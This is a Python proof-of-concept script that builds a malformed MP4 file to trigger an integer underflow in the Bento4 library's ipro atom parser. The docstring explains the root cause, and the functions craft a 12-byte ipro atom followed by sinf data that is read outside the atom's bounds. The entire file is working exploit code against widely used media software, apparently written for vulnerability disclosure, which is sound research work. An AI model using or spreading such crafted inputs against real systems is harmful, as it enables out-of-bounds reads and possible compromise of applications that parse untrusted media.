#!/usr/bin/env python3
"""
PoC generator for VULN-001: Integer Underflow in AP4_IproAtom Constructor
File: Bento4/Source/C++/Core/Ap4IproAtom.h, constructor line 70

Root cause:
  bytes_available = size - AP4_FULL_ATOM_HEADER_SIZE - 2
  When size=12 (==AP4_FULL_ATOM_HEADER_SIZE), the Create() guard only checks
  size >= 12, so size=12 passes. Then 12 - 12 - 2 wraps to 0xFFFFFFFE on
  unsigned 32-bit arithmetic (zero-extended to uint64), causing any child atom
  to pass the size check and parse bytes outside ipro's declared boundary.
"""
import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001.mp4")


def box(fourcc, data=b""):
    """Standard MP4 box: size(4) + fourcc(4) + data"""
    return struct.pack(">I", 8 + len(data)) + fourcc + data


def full_box(fourcc, version, flags, data=b""):
    """Full MP4 box: size(4) + fourcc(4) + version(1) + flags(3) + data"""
    f = bytes([version, (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF])
    return struct.pack(">I", 12 + len(data)) + fourcc + f + data


def make_ftyp():
    """ftyp box: major_brand=mp42, minor_version=0, compatible=mp42"""
    data = b"mp42" + struct.pack(">I", 0) + b"mp42"
    return box(b"ftyp", data)


def make_mvhd():
    """Minimal valid mvhd (version=0)"""
    data = (
        struct.pack(">I", 0)      # creation_time
        + struct.pack(">I", 0)    # modification_time
        + struct.pack(">I", 1000) # timescale
        + struct.pack(">I", 0)    # duration
        + struct.pack(">I", 0x00010000)  # rate = 1.0
        + struct.pack(">H", 0x0100)      # volume = 1.0
        + b"\x00" * 2            # reserved
        + b"\x00" * 8            # reserved (2 x 32-bit)
        + struct.pack(">9I",     # matrix (identity)
                      0x00010000, 0, 0,
                      0, 0x00010000, 0,
                      0, 0, 0x40000000)
        + b"\x00" * 24           # pre_defined (6 x 32-bit)
        + struct.pack(">I", 1)   # next_track_ID
    )
    return full_box(b"mvhd", 0, 0, data)


def make_sinf():
    """
    sinf container box (28 bytes total) with a schm child.
    This is placed immediately after the ipro raw bytes in the udta stream.
    The ipro constructor will read it via CreateAtomFromStream with
    bytes_available=0xFFFFFFFE (the wrapped value).
    """
    schm_data = b"mp4a" + struct.pack(">I", 0)  # scheme_type + scheme_version
    schm = full_box(b"schm", 0, 0, schm_data)   # 12 + 8 = 20 bytes
    return box(b"sinf", schm)                    # 8 + 20 = 28 bytes


def make_malicious_udta():
    """
    udta box containing:
      - ipro_raw (12 bytes): size=12 exactly, triggers underflow
      - entry_count (2 bytes): \x00\x01 = 1 entry (read OUTSIDE ipro boundary)
      - sinf (28 bytes): parsed by CreateAtomFromStream with ~4GB bytes_available
    Total content = 42 bytes; udta = 8 + 42 = 50 bytes.
    """
    # Critical: ipro atom raw = exactly 12 bytes
    # size=12, type='ipro', version=0, flags=0,0,0
    ipro_raw = struct.pack(">I", 12) + b"ipro" + b"\x00\x00\x00\x00"
    assert len(ipro_raw) == 12, "ipro_raw must be exactly 12 bytes"

    # entry_count = 1 (2 bytes, read outside ipro's declared bounds)
    entry_count = b"\x00\x01"

    # sinf atom read by the looping CreateAtomFromStream call
    sinf = make_sinf()
    assert len(sinf) == 28, f"sinf must be 28 bytes, got {len(sinf)}"

    udta_content = ipro_raw + entry_count + sinf
    assert len(udta_content) == 42, f"udta_content must be 42 bytes, got {len(udta_content)}"

    return box(b"udta", udta_content)


def main():
    ftyp = make_ftyp()
    mvhd = make_mvhd()
    udta = make_malicious_udta()

    moov_content = mvhd + udta
    moov = box(b"moov", moov_content)

    mp4_data = ftyp + moov

    with open(OUT_FILE, "wb") as f:
        f.write(mp4_data)

    print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
    print(f"    ftyp: {len(ftyp)} bytes")
    print(f"    moov: {len(moov)} bytes (mvhd={len(mvhd)}, udta={len(udta)})")
    print(f"    ipro size field = 12 -> underflow: 12-12-2 = 0xFFFFFFFE")


if __name__ == "__main__":
    main()
